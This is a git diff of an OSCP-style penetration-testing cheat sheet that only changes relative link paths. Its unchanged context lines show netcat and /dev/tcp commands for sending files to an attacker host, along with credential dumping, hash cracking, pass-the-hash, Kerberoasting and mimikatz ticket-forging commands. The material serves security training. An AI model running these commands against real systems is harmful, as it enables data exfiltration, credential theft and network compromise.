@@ -396,7 +396,7 @@ cURL and browsers collapses `../` automatically, escape the `/` with `\` to ensu
 7. Enumerate columns
 8. Retrieve data
 
-Examples (MySQL): [NullByte](https://github.com/joetanx/oscp/blob/main/vulnhub/nullbyte.md), [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [DVWA SQL Injection](/sqli-dvwa.md), [SQLi Labs](/sqli-labs.md)
+Examples (MySQL): [NullByte](https://github.com/joetanx/oscp/blob/main/vulnhub/nullbyte.md), [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [DVWA SQL Injection](/notes/sqli-dvwa.md), [SQLi Labs](/notes/sqli-labs.md)
 Example (Oracle Db): [CHRIS](https://github.com/joetanx/oscp/blob/main/pwk-lab/chris.md)
 Example (Microsoft SQL): [DJ](https://github.com/joetanx/oscp/blob/main/pwk-lab/dj.md)
 
@@ -674,7 +674,7 @@ Likely used for scenario to upload a file from target:
 |Kali|`nc -nvlp 4444 -q 1 > <file> < /dev/null`|
 |Target|`cat <file> \| nc <kali-ip> 4444`<br>or<br>`cat test.txt > /dev/tcp/<kali-ip>/4444`|
 
-## 6. [Port forwarding](/port-forwarding.md)
+## 6. [Port forwarding](/notes/port-forwarding.md)
 
 ### 6.1. SSH port forwarding
 
@@ -1304,7 +1304,7 @@ Verify listener hooked:
 
 Used in: [Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md), [SVCORP](https://github.com/joetanx/oscp/blob/main/pwk-lab/svcorp.md), [VulnDC](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-10-VulnDC.md), [VulnDC2](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-17-Vulndc2.md)
 
-### 9.1. [AS-REP roasting](https://github.com/joetanx/oscp/blob/main/attacking-active-directory.md#1-as-rep-roasting)
+### 9.1. [AS-REP roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)
 
 |   |   |
 |---|---|
@@ -1314,7 +1314,7 @@ Used in: [Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md), [SVC
 |Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
 |Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 
-### 9.2. [Password dumping](/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
+### 9.2. [Password dumping](/notes/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
 
 #### 9.2.1. mimikatz.exe
 
@@ -1352,7 +1352,7 @@ impacket-secretsdump [$DOMAIN\]$USERNAME:$PASSWORD@$TARGET
 |Domain account, password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD --lsa`|
 |Local administrator, hash|`crackmapexec smb $TARGET_RANGE -u administrator -H $NT_HASH --local-auth --lsa`|
 
-### 9.3. [Pass the hash](/attacking-active-directory.md#3-pass-the-hash)
+### 9.3. [Pass the hash](/notes/attacking-active-directory.md#3-pass-the-hash)
 
 |   |   |
 |---|---|
@@ -1361,7 +1361,7 @@ impacket-secretsdump [$DOMAIN\]$USERNAME:$PASSWORD@$TARGET
 |pth-winexe|`pth-winexe -U [$DOMAIN/]$USERNAME%$LM_HASH:$NT_HASH //TARGET cmd.exe`|
 |sekurlsa::pth + PsExec|`sekurlsa::pth /user:domainadmin /domain:$DOMAINx /ntlm:$NT_HASH`<br>`PsExec \\$TARGET cmd.exe`|
 
-### 9.4. [Kerberoasting](/attacking-active-directory.md#42-kerberoasting)
+### 9.4. [Kerberoasting](/notes/attacking-active-directory.md#42-kerberoasting)
 
 Option 1: `Invoke-Kerberoast.ps1`
 
@@ -1384,7 +1384,7 @@ hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 
 ### 9.5. Getting tickets
 
-#### 9.5.1. [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
+#### 9.5.1. [Silver ticket](/notes/attacking-active-directory.md#43-silver-ticket)
 
 ```cmd
 whoami /user
@@ -1393,7 +1393,7 @@ mimikatz # kerberos::purge
 mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
 ```
 
-#### 9.5.2. [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
+#### 9.5.2. [Golden ticket](/notes/attacking-active-directory.md#5-golden-ticket)
 
 Option 1: `impacket`
 
